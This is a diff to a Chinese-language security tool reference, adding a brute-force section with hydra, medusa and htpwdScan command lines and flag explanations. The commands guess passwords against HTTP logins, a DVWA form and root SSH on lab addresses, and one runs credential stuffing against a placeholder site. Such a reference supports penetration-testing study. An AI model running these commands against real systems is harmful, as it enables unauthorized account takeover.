@@ -35,9 +35,61 @@
 弱密码爆破
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `hydra(九头蛇) <https://github.com/vanhauser-thc/thc-hydra>`_
+	 | ``查看模块用法：hydra -U http-form-post``
+	 | ``hydra -L user.txt -P pass.txt 192.168.0.105 http-get``
+
+		::
+		
+				注：此类模块是破解HTTP服务器身份验证。
+				
+	 | ``hydra -l admin -P /usr/share/wordlists/metasploit/unix_users.txt 172.16.100.103 http-get-form \"/dvwa/login.php:username=^USER^&password=^PASS^&login=login:Login failed\" -V``
+
+		::
+		
+				-l表示单个用户名（使用-L表示用户名列表）
+				-P表示使用以下密码列表
+				http-post-form表示表单的类型
+				/ dvwa / login-php是登录页面URL
+				username是输入用户名的表单字段
+				^ USER ^告诉Hydra使用字段中的用户名或列表
+				password是输入密码的表单字段（可以是passwd，pass等）
+				^ PASS ^告诉Hydra使用提供的密码列表
+				登录表示Hydra登录失败消息
+				登录失败是表单返回的登录失败消息
+				-V用于显示每次尝试的详细输出 
+				注：此类模块是破解HTTP协议表单数据。
+				
 - `medusa(美杜莎) <https://github.com/jmk-foofus/medusa>`_
-- `htpwdScan（简单的HTTP暴力破解、撞库攻击脚本） <https://github.com/lijiejie/htpwdScan>`_
+	 | ``查询模块用法：medusa -M http -q``
+	 | ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
+	 | ``medusa –M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
+
+		::
+		
+				-M http 允许我们指定模块。
+				-h 192.168.10.1 允许我们指定主机。
+				-u admin 允许我们指定用户。
+				-P [location of password list] 允许我们指定密码列表的位置。
+				-e ns 允许我们指定额外的密码检查。 ns 变量允许我们使用用户名作为密码，并且使用空密码。
+				-n 80 允许我们指定端口号码。
+				-F 允许我们在成功找到用户名密码组合之后停止爆破。
+				注：此模块是破解HTTP服务器身份验证。
+
+	 | ``medusa -M web-form -q``
+	 
+	 ::
+	 
+			注：此模块是破解HTTP协议表单数据。
+
+- `htpwdScan <https://github.com/lijiejie/htpwdScan>`_
+	 | ``python htpwdScan.py -f dvwa.txt -d password=/usr/share/wordlists/metasploit/unix_users.txt  -err=\"password incorrect\"``
+	 | ``python htpwdScan.py -d passwd=password.txt -u=\"http://xxx.com/index.php?m=login&username=test&passwd=test\" -get -err=\"success\":false\"``
 - `patator <https://github.com/lanjelot/patator>`_
+- ncrack
+	
+	::
+	
+			注：HTTP破解支持的是HTTP服务器身份验证。
 
 路径及文件扫描
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
